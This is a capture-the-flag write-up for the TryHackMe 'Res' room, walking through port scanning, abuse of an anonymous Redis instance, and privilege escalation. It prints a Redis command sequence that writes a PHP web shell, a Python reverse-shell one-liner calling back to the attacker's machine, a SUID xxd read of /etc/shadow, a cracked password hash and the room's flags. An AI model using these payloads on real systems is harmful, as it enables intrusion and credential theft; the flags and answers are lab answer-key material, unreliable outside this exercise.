# Res
https://tryhackme.com/room/res

## Scan the machine, how many ports are open?
`nmap -sC -sV -vv $ip | tee nmap-log`

This finds a single port open on port 80, however this isn't all the ports that are open so I run a secondary scan this time using a SYN scan.

`sudo nmap -sS -p- -v $ip | tee nmap-log-syn`

This find an additional port on 6379

**Answer: 2**

## What's is the database management system installed on the server?
Aside from the name of this room we can use nmap to perform enumeration.

To do this I perform a search on my local machine for nmap scripts using `find / -name "*sql*.nse" 2>/dev/null` which returns a list of nmap scripts, however the one I want to use in this instance is called _/usr/share/nmap/scripts/ms-sql-info.nse_

I then use this script with nmap to perform some enumeration.

`nmap -sV --script=ms-sql-info -p 6379 $ip`

This finds that the service being used is called _redis_ with the version _Redis key-value store 6.0.7_

**Answer: redis**

## What port is the database management system running on?
Found earlier in our nmap SYN scan.

**Answer: 6379**

## What's is the version of management system installed on the server?
Found earlier in our NSE script scan for sql info.

**Answer: 6.0.7**

## Compromise the machine and locate user.txt 
I access the redis service using the redis-cli `redis-cli -h $ip` and run the `info` command which shows me that anonymous connections are enabled.

It also showed me that there is a user on the server called "vianka" and that 

I then check [Hacktricks](https://book.hacktricks.xyz/) for tips on pentesting Redis and find [this page](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

I then establish a webshell using my available credentials:
```
config set dir /var/www/html # Default Directory for Apache2 on Ubuntu
config set dbfilename redis.php
set test "<?php system($_GET["cmd"]); ?>"
save
```

Once this has been saved I can navigate to `http://$ip:80/redis.php` and provide the `?cmd=` parameter to pass scripts to shell for RCE.

I then check to see if Python in installed so I can establish a reverse shell on the server by setting the cmd parameter to contain: `python3 --version`

Once Python3 was confirmed to be installed I started a netcat listener on my machine `nc -lvnp 4444` and created a python command to pass to the cmd parameter to establish a reverse shell.

`python -c 'import socket,os,pty;s=socket.socket();s.connect((<VPN IP>,4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

Once this reverse shell was received I stabilized it and continued.

To find the user flag I used the following command `find / -name "*user.txt*" 2>/dev/null` and found a file in vianka's home directory `cat /home/vianka/user.txt`

**Answer: thm{red1s_rce_w1thout_credent1als}**

## What is the local user account password?

I couldn't find any way to find the local user's password with my current account so I aimed at escalating to the root user for more access.


I search for SUID binaries using the command `find / -user root -perm -4000 -print 2>/dev/null` and then check GTFO Bins for each result.

[Result: /usr/bin/xxd SUID](https://gtfobins.github.io/gtfobins/xxd/#suid)

I use this exploit to read the contents of the shadow file using `/usr/bin/xxd "/etc/shadow" | xxd -r` and get the following information:

```vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```
I write this to a file then use John to crack the hash `john hash.txt` which reveals the password as "beautiful1"

**Answer: beautiful1**

## Escalate privileges and obtain root.txt
Using the password I found from above I shell into the user vianka using `su vianka` and entering the password.

Once on the account I run `sudo -l` to check the available privileges and get the response (ALL : ALL) ALL therefore I run `sudo su -` to access the root user and navigate to the root directory and read the contents of root.txt

**Answer: thm{xxd_pr1v_escalat1on}**